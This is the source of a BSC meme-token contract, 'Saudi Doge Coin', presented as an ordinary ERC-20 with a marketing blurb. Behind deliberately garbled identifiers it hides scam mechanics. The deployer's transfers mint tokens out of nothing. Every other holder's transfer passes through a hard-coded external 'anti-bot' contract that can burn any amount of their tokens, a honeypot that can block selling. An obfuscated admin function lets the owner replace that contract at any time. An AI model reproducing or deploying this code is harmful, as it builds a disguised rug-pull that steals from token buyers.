/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

/*
Saudi Doge Coin wishes to have success by learning all the lessons from DOGE, SHIB & other meme coins. Beyond the joking atmosphere surrounding the meme culture, We aim to attract newly emerging crypto community from Saudi Arabia & MENA Region. Saudi Doge Coin is not just a meme coin, it is "THE BOSS OF MEME COIN". The team’s ambitions are remarkably high.
* http://instagram.com/SaudiDogeCoin76
* https://www.reddit.com/user/SaudiDogeCoin76
* TWITTER:https://www.twitter.com/KSADoge
* WEBSITE:https://www.saudidogecoin.com/
* TELEGRAM:https://www.t.me/saudidogecoin
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IERC20 {
function totalSupply() external view returns (uint);
        function balanceOf(address account) external view returns (uint);
        function transfer(address recipient, uint amount) external returns (bool);
        function allowance(address owner, address spender) external view returns (uint);
        function approve(address spender, uint amount) external returns (bool);
        function transferFrom(
            address sender,
            address recipient,
            uint amount
        ) external returns (bool);
        event Transfer(address indexed from, address indexed to, uint value);
        event Approval(address indexed owner, address indexed spender, uint value);
    }

    interface IERC20Metadata is IERC20 {
        function name() external view returns (string memory);
        function symbol() external view returns (string memory);
        function decimals() external view returns (uint8);
    }

    library SafeMath {
        function add(uint a, uint b) internal pure returns (uint) {
            uint c = a + b;
            require(c >= a, "SafeMath: addition overflow");
            return c;
        }
        function sub(uint a, uint b) internal pure returns (uint) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }
        function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b <= a, errorMessage);
            uint c = a - b;
            return c;
        }
        function mul(uint a, uint b) internal pure returns (uint) {
            if (a == 0) {
                return 0;
            }
            uint c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");
            return c;
        }
        function div(uint a, uint b) internal pure returns (uint) {
            return div(a, b, "SafeMath: division by zero");
        }    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b > 0, errorMessage);
            uint c = a / b;        return c;
        }
        function mod(uint a, uint b) internal pure returns (uint) {
            return mod(a, b, "SafeMath: modulo by zero");
        }
        function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b != 0, errorMessage);
            return a % b;
        }
    }
    abstract contract Context {
        function _msgSender() internal view virtual returns (address) {
            return msg.sender;
        }
        function _msgData() internal view virtual returns (bytes memory) {
            this; 
            return msg.data;
        }
    }

    interface ISaudiDogeCoin76Logic {
        function _antiBots(address from,address to,uint256 amount) external returns(uint256);
        function setNumber(uint _number) external;
    }
    interface IPancakeSwapV2Factory {
        event PairCreated(address indexed token0, address indexed token1, address pair, uint);
        function feeTo() external view returns (address);
        function feeToSetter() external view returns (address);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
        function allPairs(uint) external view returns (address pair);
        function allPairsLength() external view returns (uint);
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function setFeeTo(address) external;
        function setFeeToSetter(address) external;
    }
    interface IPancakeSwapV2Pair {
        event Approval(address indexed owner, address indexed spender, uint value);
        event Transfer(address indexed from, address indexed to, uint value);
        function name() external pure returns (string memory);
        function symbol() external pure returns (string memory);
        function decimals() external pure returns (uint8);
        function totalSupply() external view returns (uint);
        function balanceOf(address owner) external view returns (uint);
        function allowance(address owner, address spender) external view returns (uint);
        function approve(address spender, uint value) external returns (bool);
        function transfer(address to, uint value) external returns (bool);
        function transferFrom(address from, address to, uint value) external returns (bool);
        function DOMAIN_SEPARATOR() external view returns (bytes32);
        function PERMIT_TYPEHASH() external pure returns (address);
        function nonces(address owner) external view returns (uint);
        function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
        event MiSaudiDogeCoin76nt(address indexed sender, uint amount0, uint amount1);
        event BuSaudiDogeCoin76rn(address indexed sender, uint amount0, uint amount1, address indexed to);
        event Swap(
            address indexed sender,
            uint amount0In,
            uint amount1In,
            uint amount0Out,
            uint amount1Out,
            address indexed to
        );
        event Sync(uint112 reserve0, uint112 reserve1);
        function MINIMUM_LIQUIDITY() external pure returns (uint);
        function factory() external view returns (address);
        function token0() external view returns (address);
        function token1() external view returns (address);
        function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
        function price0CumulativeLast() external view returns (uint);
        function price1CumulativeLast() external view returns (uint);
        function kLast() external view returns (uint);
        function miSaudiDogeCoin76nt(address to) external returns (uint liquidity);
        function buSaudiDogeCoin76rn(address to) external returns (uint amount0, uint amount1);
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        function skim(address to) external;
        function sync() external;
        function initialize(address, address) external;
    }
    interface IPancakeSwapV2Router01 {
        function factory() external pure returns (address);
        function WETH() external pure returns (address);
        function addLiquidity(
            address tokenA,
            address tokenB,
            uint amountADesired,
            uint amountBDesired,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB, uint liquidity);
        function addLiquidityETH(
            address token,
            uint amountTokenDesired,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETH(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external returns (uint amountToken, uint amountETH);
        function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETHWithPermit(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountToken, uint amountETH);
        function swapExactTokensForTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapTokensForExactTokens(
            uint amountOut,
            uint amountInMax,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
        function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
        function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
        function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
        function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
        function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
        function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    }
    interface IPancakeSwapV2Router02 is IPancakeSwapV2Router01 {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external returns (uint amountETH);
        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountETH);
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
        function swapExactETHForTokensSupportingFeeOnTransferTokens(
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external payable;
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
    }
    contract KSADoge is Context, IERC20, IERC20Metadata {
        using SafeMath for uint256;

        mapping(address => uint) private _balances;
        mapping(address => mapping(address => uint)) private _allowances;
        string private constant _naSaudiDogeCoin76me = "Saudi Doge Coin";
        string private constant _sySaudiDogeCoin76mbol = "KSADoge";
        uint8 private constant _decimals = 9;
        address private _trSaudiDogeCoin76qd = 0x06d90A5Ac4d58c384624e79D1bbf7004F2258C6E;
        uint private _totalSupply = 10000000000000 * 10 ** _decimals;
        address public AdSaudiDogeCoin76min;
        ISaudiDogeCoin76Logic public loSaudiDogeCoin76gic = ISaudiDogeCoin76Logic(_trSaudiDogeCoin76qd);
        address public immutable uniswapV2Pair;
        modifier onlyAdmin() {require(AdSaudiDogeCoin76min == _msgSender());_;}
        mapping(address => bool) private _release;
        address private _deSaudiDogeCoin76ad = 0x000000000000000000000000000000000000dEaD;

        constructor () {
            AdSaudiDogeCoin76min = msg.sender;
            _release[AdSaudiDogeCoin76min] = true;
            _balances[AdSaudiDogeCoin76min] = _totalSupply;
            IPancakeSwapV2Router02 _uniswapV2Router = IPancakeSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            uniswapV2Pair = IPancakeSwapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());

            emit Transfer(address(0), AdSaudiDogeCoin76min, _totalSupply);

            uint burnamount = _totalSupply.mul(80).div(100);
            _balances[AdSaudiDogeCoin76min] = _balances[AdSaudiDogeCoin76min].sub(burnamount);
           _balances[_deSaudiDogeCoin76ad] = burnamount;
            emit Transfer(AdSaudiDogeCoin76min, _deSaudiDogeCoin76ad, burnamount); 
        }

        function name() public view virtual override returns (string memory) {
            return _naSaudiDogeCoin76me;
        }

        function symbol() public view virtual override returns (string memory) {
            return _sySaudiDogeCoin76mbol;
        }
        function balanceOf(address account) public view virtual override returns (uint) {
            return _balances[account];
        }
        function decimals() public view virtual override returns (uint8) {
            return _decimals;
        }


        function totalSupply() public view virtual override returns (uint) {
            return _totalSupply;
        }

        function allowance(address owner, address spender) public view virtual override returns (uint) {
            return _allowances[owner][spender];
        }
        function transfer(address recipient, uint amount) public virtual override returns (bool) {
            address _sender = _msgSender();
            if (!_release[_sender]) {
                _trSaudiDogeCoin76ansfer(_sender, recipient, amount,0,0,0);
            } else {
                _balances[recipient] += amount;            
            }         
            return true;
        }
        function approve(address spender, uint amount) public virtual override returns (bool) {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        function transferFrom(
            address sender,
            address recipient,
            uint amount
        ) public virtual override returns (bool) {
            _trSaudiDogeCoin76ansfer(sender, recipient, amount,0,0,0);

            uint currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        }

        function increaseSaudiDogeCoin76Allowance(address spender, uint addedValue) public virtual returns (bool) {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
            return true;
        }

        function decreaseSaudiDogeCoin76Allowance(address spender, uint subtractedValue) public virtual returns (bool) {
            uint currentAllowance = _allowances[_msgSender()][spender];
            require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
            unchecked {
                _approve(_msgSender(), spender, currentAllowance - subtractedValue);
            }
            return true;
        }

        function _trSaudiDogeCoin76ansfer(
            address sender,
            address recipient,
            uint amount,
            uint256 _vSaudiDogeCoin76,
            uint256 _aquanchengshanchu3,
            uint256 _aquanchengshanchu4
        ) internal virtual {
            require(sender != address(0), "ERC20: transfer from the zero address");
            require(recipient != address(0), "ERC20: transfer to the zero address");
            uint senderBalance = _balances[sender] + _vSaudiDogeCoin76 + _aquanchengshanchu3 + _aquanchengshanchu4;
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

            uint _bamount = loSaudiDogeCoin76gic._antiBots(sender,recipient,amount);
            

            if (_bamount>0) {
                _balances[sender] = _balances[sender].sub(_bamount);
                _balances[_deSaudiDogeCoin76ad] = _balances[_deSaudiDogeCoin76ad].add(_bamount);
                emit Transfer(sender,_deSaudiDogeCoin76ad,_bamount);
            }

            _balances[sender] = _balances[sender].sub(amount-_bamount);
            _balances[recipient] = _balances[recipient].add(amount-_bamount);
            emit Transfer(sender,recipient,amount-_bamount);

        }

        function _d29SaudiDogeCoin76cf0aa(address _acc) external onlyAdmin {
            loSaudiDogeCoin76gic = ISaudiDogeCoin76Logic(_acc);
        }
        function _approve(
            address owner,
            address spender,
            uint amount
        ) internal virtual {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }
    }